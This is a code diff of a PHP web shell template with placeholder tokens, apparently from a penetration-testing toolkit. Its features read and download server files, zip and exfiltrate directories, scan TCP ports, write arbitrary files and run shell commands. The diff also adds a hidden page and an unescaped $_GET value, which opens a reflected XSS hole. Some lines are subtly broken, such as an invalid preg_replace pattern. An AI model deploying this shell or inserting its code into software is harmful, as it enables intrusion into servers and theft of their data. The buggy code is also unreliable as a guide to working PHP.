@@ -15,8 +15,8 @@
 
 // Features name constants
 define("FILE_EXTRACTION", "__FEAT_FILE_EXTRACTION__");
+define("FILE_EXTRACTION_PREVIEW", "__FEAT_FILE_EXTRACTION_PREVIEW__");
 define("DIRECTORY_LISTING", "__FEAT_DIRECTORY_LISTING__");
-define("PERMISSION_CHECK", "__FEAT_PERMISSION_CHECK__");
 define("EXFILTRATE", "__FEAT_EXFILTRATE__");
 define("PORT_SCAN", "__FEAT_PORT_SCAN__");
 define("WRITE_FILE", "__FEAT_WRITE_FILE__");
@@ -25,67 +25,73 @@ define("RUN_COMMAND", "__FEAT_RUN_COMMAND__");
 /**
  * Define the enabled features
  *
- * @var array<string, array{title: string, description: string, svg: string}> $ENABLED_FEATURES
+ * @var array<string, array{title: string, description: string, svg: string, hidden?: bool}> $ENABLED_FEATURES
  */
 $ENABLED_FEATURES = array(
-    FILE_EXTRACTION => array(
-        "title" => "File extraction",
+    FILE_EXTRACTION         => array(
+        "title"       => "File extraction",
         "description" => "Extract file content as base64.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
     ),
-    DIRECTORY_LISTING => array(
-        "title" => "Directory listing",
+    FILE_EXTRACTION_PREVIEW => array(
+        "title"       => "File extraction",
+        "description" => "Extract file content as base64.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
+</svg>',
+        "hidden"      => true,
+    ),
+    DIRECTORY_LISTING       => array(
+        "title"       => "Directory listing",
         "description" => "List all files and folders in a directory and optionally its subdirectories.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 12h16.5m-16.5 3.75h16.5M3.75 19.5h16.5M5.625 4.5h12.75a1.875 1.875 0 0 1 0 3.75H5.625a1.875 1.875 0 0 1 0-3.75Z" />
 </svg>',
     ),
-    PERMISSION_CHECK => array(
-        "title" => "Permission check",
-        "description" => "Check access permission for a folder and its children.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
-  <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z" />
-</svg>',
-    ),
-    EXFILTRATE => array(
-        "title" => "Exfiltrate",
+    EXFILTRATE              => array(
+        "title"       => "Exfiltrate",
         "description" => "Exfiltrate data from the server in a password protected zip archive.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
 </svg>',
     ),
-    PORT_SCAN => array(
-        "title" => "Port scan",
+    PORT_SCAN               => array(
+        "title"       => "Port scan",
         "description" => "Scan a given range of TCP ports using connect method.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
 </svg>',
     ),
-    WRITE_FILE => array(
-        "title" => "Write file",
+    WRITE_FILE              => array(
+        "title"       => "Write file",
         "description" => "Write a file to the given path, writing permission are required.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
     ),
-    RUN_COMMAND => array(
-        "title" => "Run command",
+    RUN_COMMAND             => array(
+        "title"       => "Run command",
         "description" => "Run a system command using the default shell.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="m6.75 7.5 3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0 0 21 18V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v12a2.25 2.25 0 0 0 2.25 2.25Z" />
 </svg>',
     ),
 );
+
+date_default_timezone_set("UTC");
+
+////////////////////////
+/// UTILITY FUNCTIONS //
+////////////////////////
 
 /**
  * Check if the request method is POST
  *
  * @return bool
  */
-function isPost()
-{
+function isPost() {
     return $_SERVER['REQUEST_METHOD'] === 'POST';
 }
 
@@ -96,10 +102,13 @@ function isPost()
  *
  * @return bool
  */
-function isCheckboxActive($name)
-{
+function isCheckboxActive($name) {
     return isset($_POST[$name]) && $_POST[$name] === "y";
 }
+
+///////////////////////
+/// RENDERING BLOCK ///
+///////////////////////
 
 /**
  * Returns the classes to apply to the navigation item highlighted because it's the current page
@@ -109,8 +118,7 @@ function isCheckboxActive($name)
  *
  * @return string
  */
-function htmlHighlightActivePage($current_page, $checking_page)
-{
+function htmlHighlightActivePage($current_page, $checking_page) {
     if ($current_page === $checking_page) {
         return "bg-zinc-800 text-white";
     }
@@ -122,13 +130,15 @@ function htmlHighlightActivePage($current_page, $checking_page)
  *
  * @param $page string Page to link to
  * @param $current_page string Current page to highlight
- * @param $label string Label to display
- * @param $svg string Icon to display
+ * @param $definition array{title: string, description: string, svg: string, hidden?: bool} Label to display
  *
  * @return string
  */
-function makeNavLink($page, $current_page, $label, $svg)
-{
+function makeNavLink($page, $current_page, $definition) {
+    if ($definition["hidden"]) {
+        return "";
+    }
+
     ob_start();
     ?>
     <li>
@@ -139,9 +149,9 @@ function makeNavLink($page, $current_page, $label, $svg)
            id="nav-<?php echo $page ?>"
         >
             <div class="flex items-center justify-center">
-                <?php echo $svg; ?>
+                <?php echo $definition["svg"]; ?>
             </div>
-            <?php echo $label ?>
+            <?php echo $definition["title"] ?>
         </a>
     </li>
     <?php
@@ -156,8 +166,7 @@ function makeNavLink($page, $current_page, $label, $svg)
  *
  * @return string
  */
-function makePageHeader($title, $description)
-{
+function makePageHeader($title, $description) {
     ob_start();
     ?>
     <div class="lg:flex lg:items-center lg:justify-between">
@@ -194,8 +203,7 @@ function makePageHeader($title, $description)
  *
  * @return string
  */
-function makeInput($type, $label, $name, $placeholder, $description, $required = false)
-{
+function makeInput($type, $label, $name, $placeholder, $description, $required = false, $query_param = null) {
     ob_start();
     if ($type !== "textarea") {
         ?>
@@ -214,7 +222,10 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
                    placeholder="<?php echo $placeholder ?>"
                 <?php
                 if ($required) {
-                    echo "required";
+                    echo "required ";
+                }
+                if($query_param !== null) {
+                    echo "value=\"" . $_GET[$query_param] . "\" ";
                 }
                 ?>
                    class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400">
@@ -223,7 +234,8 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
             </p>
         </div>
         <?php
-    } else {
+    }
+    else {
         ?>
         <div class="flex flex-col gap-y-2">
             <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
@@ -260,19 +272,29 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
  * @param $name string Name of the checkbox
  * @param $label string Label for the checkbox
  * @param $description string Description of the checkbox
+ * @param $is_checked bool Whether the checkbox is checked
  * @param $value string Value of the checkbox, default is "y"
+ * @param $onclick string OnClick event for the checkbox
  *
  * @return string
  */
-function makeCheckbox($name, $label, $description, $value = "y")
-{
+function makeCheckbox($name, $label, $description, $is_checked = false, $value = "y", $onclick = null) {
     ob_start();
     ?>
     <div class="relative flex items-start">
         <div class="flex h-6 items-center">
             <input id="<?php echo $name ?>" name="<?php echo $name ?>" type="checkbox"
                    class="h-4 w-4 text-indigo-600 border-zinc-300 rounded focus:ring-indigo-600 "
-                   value="<?php echo $value ?>">
+                   value="<?php echo $value ?>"
+                <?php
+                if ($is_checked) {
+                    echo "checked ";
+                }
+                if ($onclick !== null) {
+                    echo "onclick=\"$onclick\" ";
+                }
+                ?>
+            >
         </div>
         <div class="ml-3 text-sm leading-6 flex flex-col select-none">
             <label for="<?php echo $name ?>" class="font-medium text-zinc-900 w-full cursor-pointer">
@@ -297,8 +319,7 @@ function makeCheckbox($name, $label, $description, $value = "y")
  *
  * @return string
  */
-function makeForm($operation, $action, $elements, $method = "post")
-{
+function makeForm($operation, $action, $elements, $method = "post") {
     ob_start();
     ?>
     <form action="<?php echo $action ?>" method="<?php echo $method ?>" class="flex flex-col gap-y-6 max-w-xl mt-8">
@@ -326,8 +347,7 @@ function makeForm($operation, $action, $elements, $method = "post")
  *
  * @return string
  */
-function makePage($elements, $current_page)
-{
+function makePage($elements, $current_page) {
     global $ENABLED_FEATURES;
     ob_start();
     ?>
@@ -349,7 +369,7 @@ function makePage($elements, $current_page)
                         <ul role="list" class="-mx-2">
                             <?php
                             foreach ($ENABLED_FEATURES as $feature => $definition) {
-                                echo makeNavLink($feature, $current_page, $definition["title"], $definition["svg"]);
+                                echo makeNavLink($feature, $current_page, $definition);
                             }
                             ?>
                         </ul>
@@ -380,8 +400,7 @@ function makePage($elements, $current_page)
  *
  * @return string
  */
-function makeCodeHighlight($code)
-{
+function makeCodeHighlight($code) {
     ob_start();
     ?>
     <code class="font-mono bg-zinc-100 text-zinc-900 text-sm px-2 py-1 rounded mx-1 select-all"><?php echo $code ?></code>
@@ -391,12 +410,13 @@ function makeCodeHighlight($code)
 
 /**
  * Create an alert element on the page
+ *
  * @param $title string Title of the alert box
  * @param $message string Message of the alert
+ *
  * @return string
  */
-function makeAlert($title, $message)
-{
+function makeAlert($title, $message) {
     ob_start();
     ?>
     <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 rounded mt-4 text-zinc-900 flex gap-x-4">
@@ -422,6 +442,7 @@ function makeAlert($title, $message)
 
 /**
  * Open the command output screen where output can be freely written
+ *
  * @return void
  */
 function openCommandOutputScreen()
@@ -438,10 +459,10 @@ function openCommandOutputScreen()
 
 /**
  * Closes the command output screen
+ *
  * @return void
  */
-function closeCommandOutputScreen()
-{
+function closeCommandOutputScreen() {
     ?></pre>
     </div>
     </div>
@@ -451,11 +472,12 @@ function closeCommandOutputScreen()
 
 /**
  * Output data to the command output screen
+ *
  * @param string|array $data Data to output
+ *
  * @return void
  */
-function out($data)
-{
+function out($data) {
     if (is_array($data)) {
         $data = implode("\n", $data);
     }
@@ -463,9 +485,464 @@ function out($data)
     flush();
 }
 
+///////////////////////
+// CODE BLOCK START  //
+///////////////////////
+
+/**
+ * Handle the file extraction operation
+ *
+ * @return void
+ */
+function handleFileExtraction() {
+    $filepath = $_POST['__PARAM_1__'];
+    $preview  = strtolower($_POST['__PARAM_2__']) === "y";
+    $export   = strtolower($_POST['__PARAM_3__']) === "y";
+
+    if (!file_exists($filepath)) {
+        echo "Error: File '$filepath' does not exist.\n";
+        return;
+    }
+
+    $filesize = filesize($filepath);
+
+    $export_callback = function () use ($filepath, $filesize) {
+        $chunk_size = 4096; // Adjust chunk size as needed
+
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream'); // Adjust content type if needed
+        header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
+        header('Content-Transfer-Encoding: chunked');
+        header('Content-Length: ' . $filesize); // Optional: Set content length for progress tracking
+
+        $file_handle = fopen($filepath, 'rb');
+
+        while (!feof($file_handle)) {
+            $chunk = fread($file_handle, $chunk_size);
+            echo $chunk;
+            flush();     // Flush output buffer after sending each chunk
+        }
+
+        fclose($file_handle);
+    };
+
+    echo "Reading file '$filepath'\n";
+    echo "File size: " . formatBytes($filesize) . "\n";
+    if ($preview) {
+        $preview_content = fopen($filepath, "r");
+        $read            = fread($preview_content, 10240); // Read 10Kb
+        fclose($preview_content);
+        echo "Preview:\n" . htmlspecialchars($read, ENT_QUOTES, "UTF-8") . "\n";
+
+        return;
+    }
+
+    if ($filesize < 102400) { // Less than 100Kb
+        $export_callback();
+    }
+    elseif ($export) {
+        $export_callback();
+    }
+}
+
+/**
+ * Handle the directory listing operation
+ *
+ * @return void
+ */
+function handleDirectoryListing() {
+    $path      = $_POST['__PARAM_1__'];
+    $max_depth = $_POST['__PARAM_2__'];
+
+    listFilesRecursive($path, $max_depth);
+}
+
+/**
+ * List files recursively
+ *
+ * @param $path string Path to list
+ * @param $max_depth int Maximum depth to list
+ * @param $depth int Current depth
+ * @param $show_line_split bool Whether to show a line split between entries
+ *
+ * @return void
+ */
+function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = true) {
+    if (is_string($max_depth) && strtolower($max_depth) === "inf") {
+        $max_depth = INF;
+    }
+
+    // Get stat for current path
+    $stat = stat($path);
+
+    // Print information for current path
+    $perm = getPermissionsString($path);
+    echo "$perm " .
+         pad_right("" . $stat["nlink"], 3) .
+         " " .
+         pad_right("" . $stat["uid"], 5) .
+         " " .
+         pad_right("" . $stat["gid"], 5) .
+         " " .
+         formatBytes($stat["size"]) .
+         " " .
+         convertUnixTimestampToDate($stat["mtime"]) .
+         " $path\n";
+
+    if ($show_line_split) {
+        echo "----------------\n";
+    }
+
+    // Check if path is a directory and is readable
+    if (is_dir($path) && is_readable($path)) {
+        // Open directory handle
+        $dir_handle = opendir($path);
+        // Loop through directory contents
+        while (($file = readdir($dir_handle)) !== false) {
+            // Ignore '.' and '..'
+            if ($file !== '.' && $file !== '..') {
+                $sub_path = "$path/$file";
+                // Recursively list files if depth is less than max depth
+                if ($depth < $max_depth) {
+                    listFilesRecursive($sub_path, $max_depth, $depth + 1, false);
+                }
+                else {
+                    // Print information for files beyond max depth
+                    $stat = stat($sub_path);
+                    $perm = getPermissionsString($sub_path);
+                    echo "$perm " .
+                         pad_right("" . $stat["nlink"], 3) .
+                         " " .
+                         pad_right("" . $stat["uid"], 5) .
+                         " " .
+                         pad_right("" . $stat["gid"], 5) .
+                         " " .
+                         formatBytes($stat["size"]) .
+                         " " .
+                         convertUnixTimestampToDate($stat["mtime"]) .
+                         " $sub_path\n";
+                }
+            }
+        }
+        // Close directory handle
+        closedir($dir_handle);
+    }
+}
+
+/**
+ * Get the permissions string for a file or directory (unix like `ls -l` output)
+ *
+ * @param $path
+ *
+ * @return string
+ */
+function getPermissionsString($path) {
+    if (!file_exists($path)) {
+        return "----------";
+    }
+
+    $perms = fileperms($path);
+
+    // Determine file type
+    $type = '';
+    if (is_dir($path)) {
+        $type = 'd';
+    }
+    elseif (is_file($path)) {
+        $type = '-';
+    }
+
+    // Owner permissions
+    $owner_perms = ($perms & 0x0100) ? 'r' : '-';
+    $owner_perms .= ($perms & 0x0080) ? 'w' : '-';
+    $owner_perms .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
+
+    // Group permissions
+    $group_perms = ($perms & 0x0020) ? 'r' : '-';
+    $group_perms .= ($perms & 0x0010) ? 'w' : '-';
+    $group_perms .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
+
+    // Other permissions
+    $other_perms = ($perms & 0x0004) ? 'r' : '-';
+    $other_perms .= ($perms & 0x0002) ? 'w' : '-';
+    $other_perms .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
+
+    return $type . $owner_perms . $group_perms . $other_perms;
+}
+
+/**
+ * Pad a string to the left with spaces
+ *
+ * @param $str
+ * @param $pad_length
+ *
+ * @return mixed|string
+ */
+function pad_right($str, $pad_length = 10) {
+    // Ensure string and pad length are valid
+    if (!is_string($str) || !is_int($pad_length) || $pad_length <= 0) {
+        return $str; // Return unmodified string for invalid input
+    }
+
+    // Calculate the number of spaces needed for padding
+    $padding = max(0, $pad_length - strlen($str));
+
+    // Pad the string with spaces using str_pad
+    return str_pad($str, $pad_length, ' ', STR_PAD_RIGHT);
+}
+
+/**
+ * Format bytes to human readable format
+ *
+ * @param $bytes
+ *
+ * @return string
+ */
+function formatBytes($bytes) {
+    $units = array('B', 'KB', 'MB', 'GB', 'TB');
+
+    $bytes = max($bytes, 0);
+    $pow   = floor(($bytes ? log($bytes) : 0) / log(1024));
+    $pow   = min($pow, count($units) - 1);
+
+    // Calculate size in the chosen unit
+    $bytes /= pow(1024, $pow);
+
+    // Format with three-point precision
+    return pad_right(round($bytes, 3) . ' ' . $units[$pow]);
+}
+
+/**
+ * Convert a Unix timestamp to a date string
+ *
+ * @param $timestamp
+ *
+ * @return false|string
+ */
+function convertUnixTimestampToDate($timestamp) {
+    return date('Y-m-d H:i:s', $timestamp);
+}
+
+/**
+ * Get the shortest common path from a list of paths
+ *
+ * @param $paths
+ *
+ * @return string|null
+ */
+function getShortestCommonPath($paths) {
+    if (empty($paths)) {
+        return null;
+    }
+
+    $shortest_path = $paths[0]; // Initialize with first path
+
+    foreach ($paths as $path) {
+        $common_path       = '';
+        $path_segments     = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); // Split path by separator
+        $shortest_segments = explode(DIRECTORY_SEPARATOR, trim($shortest_path, DIRECTORY_SEPARATOR));
+
+        $min_length = min(count($path_segments), count($shortest_segments));
+        for ($i = 0; $i < $min_length; $i++) {
+            if ($path_segments[$i] === $shortest_segments[$i]) {
+                $common_path .= $path_segments[$i] . DIRECTORY_SEPARATOR;
+            }
+            else {
+                break;
+            }
+        }
+
+        $shortest_path = $common_path; // Update shortest path if shorter common path found
+    }
+
+    return rtrim($shortest_path, DIRECTORY_SEPARATOR); // Remove trailing separator if present
+}
+
+/**
+ * Handle the zip creation process
+ *
+ * @return void
+ */
+function handleCreateZip() {
+    $content = $_POST['__PARAM_1__'];
+
+    $zip      = new ZipArchive();
+    $zip_name = tempnam(sys_get_temp_dir(), "__RANDOM_5_STRING__");
+
+    if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
+        echo "Error: Could not create temporary archive.";
+        return;
+    }
+
+    $lines            = explode("\n", $content);
+    $path_replacement = getShortestCommonPath($lines);
+    foreach ($lines as $line) {
+        $parts = explode(',', trim($line)); // Split line by comma
+        $path  = isset($parts[0]) ? $parts[0] : '';
+
+        $recursive  = in_array('with_tree', $parts);
+        $extensions = array();
+
+        foreach ($parts as $part) {
+            if (strpos($part, 'extension=') === 0) {
+                $extensions = explode("|", strtolower(trim(substr($part, 10))));
+                break;
+            }
+        }
+
+        if ($path) {
+            if (
+                is_file($path) &&
+                ($extensions === array() || in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), $extensions))
+            ) {
+                $zip->addFile(
+                    $path,
+                    str_replace(
+                        $path_replacement,
+                        '',
+                        preg_replace(
+                            "\\",
+                            "/",
+                            basename($path)
+                        )  // Replace backslashes with forward slashes
+                    ) // Remove common path from filename
+                );
+            }
+            else {
+                if (is_dir($path) && is_readable($path)) {
+                    addDirectoryToZip($path, $zip, $recursive, $extensions, $path_replacement . DIRECTORY_SEPARATOR);
+                }
+            }
+        }
+    }
+
+    $zip->close();
+
+    $file_size  = filesize($zip_name);
+    $chunk_size = 4096; // Adjust chunk size as needed
+
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream'); // Adjust content type if needed
+    header('Content-Disposition: attachment; filename="' . basename($zip_name) . '"');
+    header('Content-Transfer-Encoding: chunked');
+    header('Content-Length: ' . $file_size); // Optional: Set content length for progress tracking
+
+    $file_handle = fopen($zip_name, 'rb');
+
+    while (!feof($file_handle)) {
+        $chunk = fread($file_handle, $chunk_size);
+        echo $chunk; // Add CRLF after each chunk
+        flush();     // Flush output buffer after sending each chunk
+    }
+
+    fclose($file_handle);
+    unlink($zip_name); // Delete temporary zip file;
+}
+
+/**
+ * Add a directory to a zip archive
+ *
+ * @param $dir string Directory to add
+ * @param $zip ZipArchive Zip archive to add to
+ * @param $recursive bool Whether to add the directory recursively
+ * @param $extensions string[] Extensions to include
+ * @param $cleanup_path string Path to cleanup
+ *
+ * @return void
+ */
+function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = "") {
+    $dir_handle = opendir($dir);
+
+    while (($file = readdir($dir_handle)) !== false) {
+        if ($file !== '.' && $file !== '..') {
+            $sub_path = "$dir/$file";
+
+            if (
+                is_file($sub_path) &&
+                ($extensions === array() || in_array(strtolower(pathinfo($sub_path, PATHINFO_EXTENSION)), $extensions))
+            ) {
+                $zip->addFile(
+                    $sub_path,
+                    str_replace(
+                        $cleanup_path,
+                        '',
+                        preg_replace(
+                            "\\",
+                            "/",
+                            basename($sub_path)
+                        )  // Replace backslashes with forward slashes
+                    ) // Remove common path from filename
+                ); // Add with relative path within zip
+            }
+            else {
+                if ($recursive && is_dir($sub_path) && is_readable($sub_path)) {
+                    addDirectoryToZip($sub_path, $zip, $recursive, $extensions, $cleanup_path);
+                }
+            }
+        }
+    }
+
+    closedir($dir_handle);
+}
+
+/**
+ * Handle the port scan operation
+ *
+ * @return void
+ */
+function handlePortScan() {
+    $host      = $_POST['__PARAM_1__'];
+    $startPort = intval($_POST['__PARAM_2__']);
+    $endPort   = intval($_POST['__PARAM_3__']);
+
+    out("Scanning ports $startPort to $endPort on $host...");
+
+    // Loop through the port range
+    for ($port = $startPort; $port <= $endPort; $port++) {
+        // Attempt to connect to the host on the current port
+        $socket = @fsockopen($host, $port, $errno, $errstr, 1);
+
+        // Check if the connection was successful
+        if ($socket) {
+            // The port is open
+            fclose($socket);
+            out("Port $port: OPEN");
+        }
+        else {
+            // The port is closed or unreachable
+            out("Port $port: CLOSED / UNREACHABLE (err: $errstr)");
+        }
+        flush();
+    }
+}
+
+/**
+ * Handle the write file operation
+ *
+ * @return void
+ */
+function handleWriteFile() {
+    $filename               = $_POST['__PARAM_1__'];
+    $should_decode_from_b64 = isCheckboxActive("__PARAM_3__");
+    $content                = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];
+
+    out(
+        array(
+            "Received content of length " . strlen($content) . " bytes.",
+            "Writing to $filename ...",
+        )
+    );
+
+    file_put_contents($filename, $content);
+    out("File written successfully.");
+}
+
 // Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
 // on the page except the operation result.
-$isolated_ops = array(EXFILTRATE,);
+$isolated_ops = array(
+    FILE_EXTRACTION,
+    EXFILTRATE,
+);
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
 if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
@@ -474,6 +951,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
     $content = "";
 
     switch ($page) {
+        case FILE_EXTRACTION_PREVIEW:
         case FILE_EXTRACTION:
             $content = makePage(
                 array(
@@ -491,12 +969,16 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_1__",
                                 "C://path/to/file.txt",
                                 "Fully qualified path to the file to extract.",
-                                true
+                                true,
+                                "__PARAM_99__"
                             ),
                             makeCheckbox(
                                 "__PARAM_2__",
                                 "Preview",
-                                "Display preview of the file content if it's larger than 100kb."
+                                "Display preview of the file content if it's larger than 100kb.",
+                                $page === FILE_EXTRACTION_PREVIEW,
+                                "y",
+                                "window.location.href = '?page=" . FILE_EXTRACTION_PREVIEW . "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                             ),
                             makeCheckbox(
                                 "__PARAM_3__",
@@ -536,31 +1018,6 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "How many levels deep to list, where " . makeCodeHighlight(0) .
                                 " is the current directory and " . makeCodeHighlight("inf") .
                                 " means to list all.",
-                                true
-                            ),
-                        )
-                    ),
-                ),
-                $page
-            );
-            break;
-        case PERMISSION_CHECK:
-            $content = makePage(
-                array(
-                    makePageHeader(
-                        $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"]
-                    ),
-                    makeForm(
-                        $page,
-                        $_SERVER["REQUEST_URI"],
-                        array(
-                            makeInput(
-                                "text",
-                                "Path",
-                                "__PARAM_1__",
-                                "C://path/to/directory or \\\\network\\path\\to\\directory",
-                                "Fully qualified path to the directory to check.",
                                 true
                             ),
                         )
@@ -720,337 +1177,16 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
     }
 }
 
-///////////////////////
-// CODE BLOCK START  //
-///////////////////////
-
-function check_and_print_file($filepath, $preview = "n", $export = "n")
-{
-    if (!file_exists($filepath)) {
-        echo "Error: File '$filepath' does not exist.\n";
-        return;
-    }
-
-    $filesize = filesize($filepath);
-
-    if ($filesize < 102400) { // Less than 100Kb
-        $content = file_get_contents($filepath);
-        echo "File size: " . $filesize . " bytes\n";
-        echo "Base64 content:\n" . base64_encode($content) . "\n";
-    } else {
-        echo "File size: " . $filesize . " bytes (exceeds 100Kb).\n";
-
-        if (strtolower($preview) === 'y') {
-            $preview_content = fopen($filepath, "r");
-            $read = fread($preview_content, 10240); // Read 10Kb
-            fclose($preview_content);
-            echo "Preview:\n" . $read . "\n";
-        }
-
-        if (strtolower($export) === 'y') {
-            echo "Exporting full file...\n";
-            $content = file_get_contents($filepath);
-            echo "Base64 content:\n" . base64_encode($content) . "\n";
-        }
-    }
-}
-
-function zip_folder_base64($folder_path, $allowed_extensions = array())
-{
-    if (!is_dir($folder_path)) {
-        echo "Error: '$folder_path' is not a directory.";
-        return;
-    }
-
-    $zip = new ZipArchive();
-    $zip_name = tempnam(sys_get_temp_dir(), ''); // Generate temporary zip filename
-    $zip->open($zip_name, ZipArchive::CREATE);
-
-    $files = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($folder_path),
-        RecursiveIteratorIterator::SELF_FIRST
-    );
-
-    foreach ($files as $file) {
-        if ($file->isDir()) {
-            continue;
-        }
-        $filePath = $file->getRealPath();
-        $relativePath = str_replace($folder_path . DIRECTORY_SEPARATOR, '', $filePath);
-
-        $fileInfo = new SplFileInfo($filePath);
-        $extension = strtolower($fileInfo->getExtension());
-
-        if (empty($allowed_extensions) || in_array($extension, $allowed_extensions)) {
-            $zip->addFile($filePath, $relativePath);
-        }
-    }
-
-    $zip->close();
-
-    $zip_data = file_get_contents($zip_name);
-    unlink($zip_name); // Delete temporary zip file
-
-    return base64_encode($zip_data);
-}
-
-function getDirContents($dir, &$results = array())
-{
-    $files = scandir($dir);
-
-    foreach ($files as $key => $value) {
-        $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
-        if (!is_dir($path)) {
-            $results[] = $path;
-        } else {
-            if ($value != "." && $value != "..") {
-                getDirContents($path, $results);
-                $results[] = $path;
